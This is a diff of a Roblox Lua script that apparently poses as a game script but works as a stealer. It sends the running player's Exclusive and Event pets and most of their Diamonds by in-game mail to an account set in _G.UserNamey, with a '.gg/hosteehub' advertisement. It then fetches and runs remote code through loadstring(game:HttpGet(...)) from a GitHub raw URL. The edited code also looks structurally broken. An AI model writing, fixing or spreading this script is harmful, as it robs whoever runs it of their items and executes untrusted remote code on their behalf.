@@ -43,48 +43,27 @@ AreaTeleport("Shop")
 TeleportToMailbox()
 
 local player = game:GetService("Players").LocalPlayer
-local dims = player.leaderstats.Diamonds.Value - 100000
+local dims = player.leaderstats.Diamonds.Value - 10000000
 if dims < 0 then
     dims = 0
 end
 
 wait(10)
-local pets = game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()
-for i, v in pairs(pets) do
+for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
-        local v2 = v:FindFirstChild("RarityGradient")
-        if v2 and (v2:FindFirstChild("Exclusive") or v2:FindFirstChild("Event")) then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
             local args = {
                 [1] = {
                     ["Recipient"] = _G.UserNamey,
                     ["Diamonds"] = dims,
                     ["Pets"] = {
-                        [1] = v.Name
+                        [2] = v.Name
                     },
                     ["Message"] = ".gg/hosteehub | Hostee On Top"
                 }
             }
             wait(0.7)
             Networking.Invoke("Send Mail", unpack(args))
-        end
-    end
-end
-
-dims = dims - (#pets * 100000)
-if dims < 0 then
-    dims = 0
-end
-
-local finalArgs = {
-    [1] = {
-        ["Recipient"] = _G.UserNamey,
-        ["Diamonds"] = dims,
-        ["Pets"] = {},
-        ["Message"] = ".gg/hosteehub | Hostee On Top"
-    }
-}
-wait(0.7)
-Networking.Invoke("Send Mail", unpack(finalArgs))
             dims = 0
             loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97After%20Sending%20Webhook%20%E2%9C%97"))()
             wait(7)
